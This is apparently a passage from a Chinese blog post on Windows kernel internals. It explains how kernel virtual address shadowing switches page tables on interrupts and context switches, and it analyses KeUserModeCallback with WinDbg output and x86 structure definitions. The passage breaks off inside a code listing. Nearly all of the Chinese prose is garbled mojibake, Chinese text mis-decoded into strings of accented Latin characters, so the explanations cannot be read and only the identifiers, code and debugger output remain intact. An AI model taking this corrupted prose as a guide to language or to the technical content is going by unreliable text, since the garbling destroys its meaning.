<p>ä¸ºäº†åˆ†æWindowså†…æ ¸é¡µè¡¨éš”ç¦»çš„æ“ä½œæµç¨‹ï¼Œå¯ä»¥çœ‹Windowså„ä¸­æ–­ä¾‹ç¨‹ä»£ç ã€‚æˆ‘ä»¬çŸ¥é“å½“ä¸­æ–­å‘ç”Ÿæ—¶ï¼Œéœ€è¦ä»Ring3è¿›å…¥Ring0æ‰§è¡Œä»£ç ï¼Œè¿™ä¸ªè¿‡ç¨‹è‚¯å®šæ˜¯è¦å¤„ç†KVASçš„é—®é¢˜çš„ï¼Œä»¥Int3ä¸­æ–­å¤„ç†ä¾‹ç¨‹KiBreakpointTrapShadowä¸ºä¾‹</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiBreakpointTrapShadow.jpg" alt="KiBreakpointTrapShadow"></p>
<p>v6.OffsetLowæ˜¯PreviousModeï¼Œå³å‘ç”Ÿä¸­æ–­æ—¶æ˜¯å±äºå“ªä¸ªModeã€‚å¦‚æœæ˜¯UserModeï¼Œåˆ™ä¼šè¿›å…¥ifä½“ã€‚åœ¨ifä½“å†…ï¼Œå…ˆæ‰§è¡Œäº†swapgsæŒ‡ä»¤ï¼Œäº¤æ¢GSå¯„å­˜å™¨ä¸IA32_KERNEL_GS_BASEã€‚å…¶ä¸­ï¼ŒIA32_KERNEL_GS_BASEå¯„å­˜å™¨æ˜¯ä¸€ä¸ªMSRå¯„å­˜å™¨ï¼Œç”¨äº†ä¿å­˜kernelçº§åˆ«çš„æ•°æ®ç»“æ„æŒ‡é’ˆï¼Œå› ä¸ºåœ¨è¿™ä¸ªä½ç½®ï¼Œè¿˜æ²¡æœ‰æ˜ å°„å†…æ ¸å†…å­˜ï¼ˆåªæ˜ å°„äº†å°‘æ•°å…¥å£ç‚¹ï¼‰ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡GSè·å¾—å¿…è¦çš„ä¿¡æ¯ã€‚gs[0x9000]åŒ…å«PML4åŸºå€çš„ç‰©ç†åœ°å€ï¼ˆKernelDirectoryTableBaseï¼‰ï¼Œè€Œgs[0x9018]åˆ™æ˜¯ä¸€ä¸ªæ ‡å¿—ä½ï¼ˆShadowFlagsï¼‰ï¼Œæ ‡å¿—æ˜¯å¦å¼€å¯KVASï¼Œè‹¥å¼€å¯åˆ™å°†KernelDirectoryTableBaseå†™å…¥CR3ï¼Œä»¥å®ŒæˆCR3çš„åˆ‡æ¢ã€‚é‚£ä¹ˆå†³å®šæ˜¯å¦è½¬æ¢é¡µè¡¨çš„å°±æ˜¯è¿™ä¸ªShadowFlagsï¼Œéœ€è¦çœ‹ä¸€ä¸‹è¿™ä¸ªä½ç½®æ˜¯åœ¨å“ªé‡Œè®¾ç½®çš„ã€‚</p>
<p>KVASè¿™ä¸ªä¸œè¥¿æ˜¯å’Œè¿›ç¨‹ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´gs[0x9018]è¿™ä¸ªæ ‡å¿—ä½ä¼šåœ¨è¿›&#x2F;çº¿ç¨‹å‘ç”Ÿåˆ‡æ¢çš„æ—¶å€™æ ¹æ®ä¸Šä¸‹æ–‡çš„çŠ¶æ€è¢«è®¾ç½®ã€‚ntoskrnlä¸­ï¼Œåˆ‡æ¢ä¸Šä¸‹æ–‡çš„å‡½æ•° KiSwapContext è°ƒç”¨ SwapContextï¼Œå…¶ä¸­ä¼šæ ¹æ®ä¸Šä¸‹æ–‡è®¾ç½®è¯¥æ ‡å¿—ä½ä»¥å†³å®šè¿™æ¡çº¿ç¨‹å‘ç”Ÿä¸­æ–­æ—¶æ˜¯å¦éœ€è¦è½¬åŒ–é¡µè¡¨ã€‚<br><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/SwapContext.jpg" alt="SwapContext"></p>
<p>åœ¨è¿™éƒ¨åˆ†ä»£ç ä¸­ï¼Œä¼šå°†PCB.DirectoryTableBaseå†™å…¥PRCB.KernelDirectoryTableBaseï¼Œä¹Ÿå°±æ˜¯å‰é¢çœ‹åˆ°çš„GS[0x9000]ä½ç½®ï¼›å¹¶ä¼šä¾æ®KPROCESS-&gt;AddressPolicyæ¥è®¾ç½®ShadowFlagsï¼ˆGS[0x9018]ï¼‰, KPROCESS-&gt;AddressPolicyåœ¨è¿›ç¨‹åˆ›å»ºæ—¶ä¾æ®è¿›ç¨‹æ˜¯å¦ç”±ç®¡ç†å‘˜èº«ä»½å¯åŠ¨è€Œè®¾ç½®ï¼ˆNtCreateProcess-&gt;PspAllocateThread-&gt;PspUserThreadStartup-&gt;PspDisablePrimaryTokenExchange-&gt;SeTokenIsAdmin&#x2F;SecureHandle-&gt;Process-&gt;Pcb.AddressPolicy &#x3D; 1ï¼‰ï¼Œå¦‚æœæ˜¯ç®¡ç†å‘˜è¿›ç¨‹ï¼Œåˆ™KPROCESS-&gt;AddressPolicyä¸º1ï¼ŒShadowFlagsä¼šè¢«è®¾ç½®ä¸º2ï¼Œè‹¥æ˜¯æ™®é€šè¿›ç¨‹ï¼Œåˆ™ShadowFlagsä¸º1ã€‚ åœ¨ä¸­æ–­å‘ç”Ÿæ—¶ï¼Œä¼šä¾æ®ShadowFlagsåˆ¤æ–­æ˜¯å¦è¦åˆ‡æ¢CR3åˆ°PCB.DirectoryTableBaseã€‚PCB.DirectoryTableBaseä¸­æ˜ å°„äº†å†…æ ¸å†…å­˜ï¼Œè€ŒPCB.UserDirectoryTableBaseæ²¡æœ‰æ˜ å°„å†…æ ¸å†…å­˜ï¼Œè€Œéç‰¹æƒçº§åº”ç”¨ç¨‹åºåœ¨ä¸‰ç¯ä¸­ä½¿ç”¨çš„æ—¶UserDirectoryTableBaseï¼Œåªæœ‰åœ¨ä¸­æ–­æ—¶æ‰ä¼šè¢«åˆ‡æ¢åˆ°DirectoryTableBaseä»è€Œè¾¾åˆ°å†…æ ¸é¡µè¡¨éš”ç¦»çš„ç›®çš„ã€‚</p>
<p>å…³äºéç‰¹æƒçº§åº”ç”¨ç¨‹åºå…·æœ‰dual CR3è€Œç‰¹æƒçº§åº”ç”¨ç¨‹åºåªæœ‰ä¸€ä¸ªCR3ï¼ˆPCB.UserDirectoryTableBaseä¸ºç©ºï¼‰è¿˜åœ¨ <em>KiKernelSysretExit</em> ä¸­æœ‰ä½“ç°ï¼Œè¯¥å‡½æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨å®Œæˆåä»Ring0è¿”å›ä¸‰ç¯çš„å‡½æ•°ã€‚<br><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiKernelSysretExit.jpg" alt="img"><br>å¯ä»¥çœ‹åˆ°å¯¹è¿›ç¨‹ç±»å‹åšäº†åˆ¤æ–­ï¼Œå¦‚æœæ˜¯éç‰¹æƒçº§è¿›ç¨‹ä¼šè·å–åˆ°KPROCESS-&gt;UserDirectoryTableBaseå¹¶å¡«å…¥CR3ä»¥æ¢å¤å†…æ ¸é¡µè¡¨éš”ç¦»ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://www.qfrost.com/WindowsKernel/KVAS/">http://www.qfrost.com/WindowsKernel/KVAS/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/96505%E2%80%94%E2%80%94https://www.fortinet.com/blog/threat-research/a-deep-dive-analysis-of-microsoft-s-kernel-virtual-address-shadow-feature">https://www.anquanke.com/post/id/96505â€”â€”https://www.fortinet.com/blog/threat-research/a-deep-dive-analysis-of-microsoft-s-kernel-virtual-address-shadow-feature</a></p>
<p><a target="_blank" rel="noopener" href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p>
<p><a target="_blank" rel="noopener" href="https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/">https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/</a></p>
<p><a target="_blank" rel="noopener" href="https://businessresources.bitdefender.com/hubfs/noindex/Bitdefender-WhitePaper-SWAPGS.pdf">https://businessresources.bitdefender.com/hubfs/noindex/Bitdefender-WhitePaper-SWAPGS.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://back.engineering/29/03/2021/">https://back.engineering/29/03/2021/</a></p>
<p><a target="_blank" rel="noopener" href="https://caslab.csl.yale.edu/tutorials/asplos2021/asplos2021_tutorial_part1_public.pdf">https://caslab.csl.yale.edu/tutorials/asplos2021/asplos2021_tutorial_part1_public.pdf</a></p>
<h2 id="4-User-Mode-CallBack"><a href="#4-User-Mode-CallBack" class="headerlink" title="4 User-Mode CallBack"></a>4 User-Mode CallBack</h2><p>Windows ä¸€å…±æä¾›ä¸‰ç§ç”¨æˆ·å›è°ƒçš„æ–¹å¼ï¼Œå…è®¸ä»å†…æ ¸æ‰§è¡Œçš„å‡½æ•°é€æ­¥è°ƒç”¨åˆ°ç”¨æˆ·ç©ºé—´çš„å‡½æ•°ã€‚</p>
<ol>
<li>User-Mode APC Executeã€‚</li>
<li>User-Mode Exception Handerã€‚</li>
<li>User-Mode CallBackã€‚</li>
</ol>
<p> <strong>æ³¨æ„</strong>ï¼šå‰ä¸¤ç§å…ˆå‰æ¨¡å¼ <code>PreviousMode = UserMode(1)</code>ï¼Œåæœ€åä¸€ç§å…ˆå‰æ¨¡å¼ <code>PreviousMode = KernelMode(0)</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·å›è°ƒï¼ˆUser-Mode CallBackï¼‰æ˜¯ä» R0 ä¸»åŠ¨å‘èµ·çš„ï¼Œæœ€ç»ˆä¹Ÿå°†å›åˆ° R0ã€‚</p>
<p>ä¸ç®¡ <code>win32kfull</code> ä¸­çš„å“ªä¸€ä¸ªå‡½æ•°å‘èµ·çš„ç”¨æˆ·å›è°ƒï¼Œéƒ½éœ€è¦è°ƒç”¨åˆ° <code>nt!KeUserModeCallback</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KeUserModeCallback</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  ULONG     ApiNumber,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  PVOID     InputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  ULONG     InputLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PVOID    *OutputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN  PULONG    OutputLength</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br></pre></td></tr></table></figure>



<ul>
<li>ApiNumberï¼šè¿™æ˜¯ç”¨æˆ·ç©ºé—´å‡½æ•°åœ¨ <code>User32!apfnDispatch</code> æˆ– <code>PEB.KernelCallbackTable</code> å›è°ƒè¡¨çš„ç´¢å¼•ã€‚</li>
<li>InputBufferï¼šæ˜¯ä¸€å—ç¼“å†²åŒºï¼Œç”¨æ¥å­˜æ”¾ä» 0 ç¯å¸¦åˆ° 3 ç¯çš„æ•°æ®ï¼ˆå‚æ•°ï¼‰ã€‚é’ˆå¯¹ä¸åŒçš„å›è°ƒå‡½æ•°ï¼Œè¯¥ç¼“å†²åŒºä¸­çš„ç»“æ„ä¸åŒã€‚</li>
<li>InputLengthï¼šæŒ‡å®šå‚æ•° 2 <code>InputBuffer</code> çš„é•¿åº¦ï¼Œå¤§å°ä¸ºå­—èŠ‚ã€‚</li>
<li>OutputBufferï¼šå½“å›è°ƒå‡½æ•°ä» 3 ç¯è¿”å›æ—¶ï¼Œä» 3 ç¯å¸¦å›æ¥çš„æ•°æ®å°±å­˜æ”¾åœ¨é‡Œé¢ã€‚æ˜¯ä¸€ä¸ªäºŒçº§æŒ‡é’ˆï¼Œç±»ä¼¼äº ESPã€EBP ç­‰ã€‚</li>
<li>OutputLengthï¼šè¾“å‡ºç¼“å†²åŒºçš„å¤§å°ï¼Œä» 3 ç¯å¸¦å›æ¥çš„ç¼“å†²åŒºæ•°æ®å¤§å°ã€‚å•ä½æ˜¯å­—èŠ‚ã€‚</li>
</ul>
<blockquote>
<p>æœ¬èŠ‚ä»¥ Windows 10 x86 19041 ä¸ºä¾‹ã€‚</p>
</blockquote>
<p>ç”¨æˆ·å›è°ƒä¸»è¦æ¶‰åŠåˆ°çš„å‡½æ•°ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/17/qlS4ixbLKZfuv1o.png" alt="32.png"></p>
<p>è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/17/rKCBDAQFqglvf9j.png" alt="31.png"></p>
<h3 id="4-1-å‚æ•°è§£é‡Š"><a href="#4-1-å‚æ•°è§£é‡Š" class="headerlink" title="4.1 å‚æ•°è§£é‡Š"></a>4.1 å‚æ•°è§£é‡Š</h3><h4 id="ApiNumber"><a href="#ApiNumber" class="headerlink" title="ApiNumber"></a>ApiNumber</h4><p>è¿›ç¨‹ä¸­åˆå§‹åŒ– <code>USER32.dll</code> æœŸé—´ï¼Œä¼šæ ¹æ®å…¨å±€æŒ‡é’ˆ <code>User32!apfnDispatch</code> å°†å…¶åœ°å€å¤åˆ¶åˆ°è¿›ç¨‹ç¯å¢ƒå— <code>PEB.KernelCallbackTable</code>ã€‚è¿™ä¸ªè¡¨é‡Œé¢å­˜çš„å‡½æ•°åœ°å€å³ä¸ºç”¨æˆ·å›è°ƒå‡½æ•°ã€‚åœ¨å­¦ä¹ å…±äº«å†…å­˜åŒºï¼ˆSectionï¼‰æ—¶çŸ¥é“ï¼Œæ‰€æœ‰è¿›ç¨‹å…±äº«ä¸€ä»½å¯æ‰§è¡Œæ–‡ä»¶æ˜ å°„çš„ç‰©ç†å†…å­˜é¡µï¼Œå¯¹äºç³»ç»Ÿ DLLï¼Œå…¶ç‰©ç†é¡µæ˜ å°„åˆ°æ‰€æœ‰è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´èµ·å§‹åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼ˆéç³»ç»Ÿæ–‡ä»¶æ˜ å°„çš„èµ·å§‹åœ°å€ä¸ä¸€å®šç›¸åŒï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment">kd&gt; dt nt!_PEB @$peb -y KernelCallbackTable</span></span><br><span class="line"><span class="comment">   +0x02c KernelCallbackTable : 0x77571000 Void</span></span><br><span class="line"><span class="comment">***/</span></span><br><span class="line">kd&gt; ?User32!apfnDispatch</span><br><span class="line">Evaluate expression: <span class="number">2002194432</span> = <span class="number">77571000</span></span><br><span class="line"></span><br><span class="line">kd&gt; dds <span class="number">77571000</span> L20</span><br><span class="line"><span class="number">77571000</span>  <span class="number">7758</span>d820 user32!__fnCOPYDATA</span><br><span class="line"><span class="number">77571004</span>  <span class="number">775e6</span>f50 user32!__fnCOPYGLOBALDATA</span><br><span class="line"><span class="number">77571008</span>  <span class="number">77590</span>ca0 user32!__fnDWORD</span><br><span class="line"><span class="number">7757100</span>c  <span class="number">775951</span>a0 user32!__fnNCDESTROY</span><br><span class="line"><span class="number">77571010</span>  <span class="number">7757</span>a3d0 user32!__fnDWORDOPTINLPMSG</span><br><span class="line"><span class="number">77571014</span>  <span class="number">775e7690</span> user32!__fnINOUTDRAG</span><br><span class="line"><span class="number">77571018</span>  <span class="number">77579620</span> user32!__fnGETTEXTLENGTHS</span><br><span class="line"><span class="number">7757101</span>c  <span class="number">775e7320</span> user32!__fnINCNTOUTSTRING</span><br><span class="line"><span class="number">77571020</span>  <span class="number">775e73</span>c0 user32!__fnINCNTOUTSTRINGNULL</span><br><span class="line"><span class="number">77571024</span>  <span class="number">775e7460</span> user32!__fnINLPCOMPAREITEMSTRUCT</span><br><span class="line"><span class="number">77571028</span>  <span class="number">77593450</span> user32!__fnINLPCREATESTRUCT</span><br><span class="line"><span class="number">7757102</span>c  <span class="number">775e74</span>b0 user32!__fnINLPDELETEITEMSTRUCT</span><br><span class="line"><span class="number">77571030</span>  <span class="number">775e7500</span> user32!__fnINLPDRAWITEMSTRUCT</span><br><span class="line"><span class="number">77571034</span>  <span class="number">775e7560</span> user32!__fnINLPHELPINFOSTRUCT</span><br><span class="line"><span class="number">77571038</span>  <span class="number">775e7560</span> user32!__fnINLPHELPINFOSTRUCT</span><br><span class="line"><span class="number">7757103</span>c  <span class="number">775e7630</span> user32!__fnINLPMDICREATESTRUCT</span><br><span class="line"><span class="number">77571040</span>  <span class="number">775e76</span>e0 user32!__fnINOUTLPMEASUREITEMSTRUCT</span><br><span class="line"><span class="number">77571044</span>  <span class="number">77594</span>de0 user32!__fnINLPWINDOWPOS</span><br><span class="line"><span class="number">77571048</span>  <span class="number">77595500</span> user32!__fnINOUTLPPOINT5</span><br><span class="line"><span class="number">7757104</span>c  <span class="number">77579730</span> user32!__fnINOUTLPSCROLLINFO</span><br><span class="line"><span class="number">77571050</span>  <span class="number">77597</span>d90 user32!__fnINOUTLPRECT</span><br><span class="line"><span class="number">77571054</span>  <span class="number">77594940</span> user32!__fnINOUTNCCALCSIZE</span><br><span class="line"><span class="number">77571058</span>  <span class="number">77579730</span> user32!__fnINOUTLPSCROLLINFO</span><br><span class="line"><span class="number">7757105</span>c  <span class="number">775e77</span>d0 user32!__fnINPAINTCLIPBRD</span><br><span class="line"><span class="number">77571060</span>  <span class="number">775e7840</span> user32!__fnINSIZECLIPBRD</span><br><span class="line"><span class="number">77571064</span>  <span class="number">775790</span>a0 user32!__fnINDESTROYCLIPBRD</span><br><span class="line"><span class="number">77571068</span>  <span class="number">7758</span>d7c0 user32!__fnINSTRING</span><br><span class="line"><span class="number">7757106</span>c  <span class="number">7758</span>d7c0 user32!__fnINSTRING</span><br><span class="line"><span class="number">77571070</span>  <span class="number">7758f</span>9a0 user32!__fnINDEVICECHANGE</span><br><span class="line"><span class="number">77571074</span>  <span class="number">7758</span>d640 user32!__fnPOWERBROADCAST</span><br><span class="line"><span class="number">77571078</span>  <span class="number">77594f</span>a0 user32!__fnINLPUAHDRAWMENU</span><br><span class="line"><span class="number">7757107</span>c  <span class="number">7757</span>aa80 user32!__fnOPTOUTLPDWORDOPTOUTLPDWORD</span><br></pre></td></tr></table></figure>



<h4 id="InputBuffer"><a href="#InputBuffer" class="headerlink" title="InputBuffer"></a>InputBuffer</h4><p>ä» <code>win32kfull</code> ä¸­ä¸åŒçš„å‡½æ•°å‘èµ·çš„ <code>KeUserModeCallback</code> è°ƒç”¨ï¼Œ<code>InputBuffer</code> ä¸­ä¼šå­˜æ”¾ä¸åŒçš„ç»“æ„ã€‚ä½†æ˜¯ <code>InputBuffer</code> ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå›ºå®šéƒ¨åˆ†ï¼ˆfixï¼‰ã€å¯å˜éƒ¨åˆ†ï¼ˆvariableï¼‰ã€‚</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒï¼šã€Š<a target="_blank" rel="noopener" href="https://www.stormshield.com/news/how-to-run-userland-code-from-the-kernel-on-windows/">How to run userland code from the kernel on Windows</a>ã€‹ã€ã€Š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184233">KeUserModeCallback è¿‡ç¨‹è¯¦ç»†åˆ†æ</a>ã€‹ã€‚</p>
<h3 id="4-2-KeUserModeCallback-å‡½æ•°åˆ†æ"><a href="#4-2-KeUserModeCallback-å‡½æ•°åˆ†æ" class="headerlink" title="4.2 KeUserModeCallback å‡½æ•°åˆ†æ"></a>4.2 KeUserModeCallback å‡½æ•°åˆ†æ</h3><p>è¯¥å‡½æ•°ä¸»è¦åšä»¥ä¸‹å‡ ä»¶äº‹ï¼š</p>
<ol>
<li><p>çŠ¶æ€ã€æ ‡å¿—åˆ¤æ–­ã€‚</p>
<p>KTHREAD.CalloutActive &#x3D;&#x3D; 0<br>IRQL &#x3D;&#x3D; PASSIVE_LEVEL(0)<br>ApcStateIndex &#x3D;&#x3D; 0ï¼ˆæœªæŒ‚é ï¼‰<br>KernelApcDisable &#x3D;&#x3D; 0ï¼ˆæœªç¦ç”¨ï¼‰</p>
</li>
<li><p>æ–°å»ºä¸€ä¸ªå†…æ ¸æ ˆï¼Œç”¨æ¥ä¿å­˜å½“å‰çº¿ç¨‹ç¯å¢ƒä¿¡æ¯ã€‚</p>
<p>åœ¨ Windows XP ä¸­æ¯æ¬¡å›è°ƒå‰ï¼Œéƒ½ä¼šå°†å†…æ ¸æ ˆæå‡ï¼Œç„¶åå°†å½“å‰çš„çº¿ç¨‹ä¿¡æ¯ä¿å­˜èµ·æ¥ã€‚ä½†æ˜¯æ¶‰åŠåˆ°å¤šæ¬¡ R0-R3 é€’å½’åµŒå¥—è°ƒç”¨ï¼Œé€’å½’è°ƒç”¨å›è°ƒæ ˆç©ºé—´ä¼šè¢«å¾ˆå¿«è€—å°½ã€‚ä» Vista ä»¥åï¼Œæ¯æ¬¡å›è°ƒå‰éƒ½ä¼šä½¿ç”¨å‡½æ•° <code>MmCreateKernelStack</code> æ¥æ–°å»ºä¸€ä¸ªå†…æ ¸æ ˆï¼Œå°†å½“å‰çº¿ç¨‹çš„ <code>TrapFrame</code> å’Œçº¿ç¨‹å †æ ˆä¿¡æ¯ä¿å­˜èµ·æ¥ï¼Œæ–¹ä¾¿ä» 3 ç¯è¿”å›å›æ¥æ—¶è®© <code>nt!NtCallbackReturn(x, x, x)</code> æ¥ä½¿ç”¨ã€‚</p>
</li>
</ol>
<h4 id="KSTACK-CONTROL"><a href="#KSTACK-CONTROL" class="headerlink" title="KSTACK_CONTROL"></a>KSTACK_CONTROL</h4><p>å‡½æ•° <code>MmCreateKernelStack</code> è¿”å›æ¥çš„å †æ ˆï¼Œ<code>KeUserModeCallback</code> ä¼šå‘å…¶ä¸­å¡«å……ï¼š<code>_KTRAP_FRAME</code>ï¼Œ<code>_KSTACK_CONTROL</code> ç»“æ„ä¿¡æ¯ã€‚</p>
<p>å®é™…ä¸Šåœ¨ Windows 7 ä¸­è¿™ä¸¤ä¸ªç»“æ„åŒ…å«åœ¨ <code>_KSTACK_AREA</code> ä¸­ï¼Œä½†æ˜¯ Windows 10 å–æ¶ˆäº†ã€‚æ‰€ä»¥æˆ‘è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªç»“æ„ <code>_KSTACK_CONTROL_WIN10</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xAC bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> _KSTACK_CONTROL_WIN10</span><br><span class="line">&#123;</span><br><span class="line">  KTRAP_FRAME TrapFrame;</span><br><span class="line">  KSTACK_CONTROL StackControl;</span><br><span class="line">&#125;KSTACK_CONTROL_WIN10;</span><br></pre></td></tr></table></figure>

<p>åœ¨ Windows 10 x86 ä¸­ï¼Œ<code>KSTACK_CONTROL</code> ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x20 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KSTACK_CONTROL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG StackBase;                                                        <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG ActualLimit;                                                  <span class="comment">//0x4</span></span><br><span class="line">        ULONG StackExpansion:<span class="number">1</span>;                                             <span class="comment">//0x4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span>* <span class="title">PreviousTrapFrame</span>;</span>                                 <span class="comment">//0x8</span></span><br><span class="line">    VOID* PreviousExceptionList;                                            <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KERNEL_STACK_SEGMENT</span> <span class="title">Previous</span>;</span>                                  <span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>åœ¨ Windows 10 x86 ä¸­ï¼Œ<code>KERNEL_STACK_SEGMENT</code> ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KERNEL_STACK_SEGMENT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG StackBase;                                                        <span class="comment">//0x0</span></span><br><span class="line">    ULONG StackLimit;                                                       <span class="comment">//0x4</span></span><br><span class="line">    ULONG KernelStack;                                                      <span class="comment">//0x8</span></span><br><span class="line">    ULONG InitialStack;                                                     <span class="comment">//0xc</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>





<h4 id="KeUserModeCallbackæºç åˆ†æ"><a href="#KeUserModeCallbackæºç åˆ†æ" class="headerlink" title="KeUserModeCallbackæºç åˆ†æ"></a>KeUserModeCallbackæºç åˆ†æ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 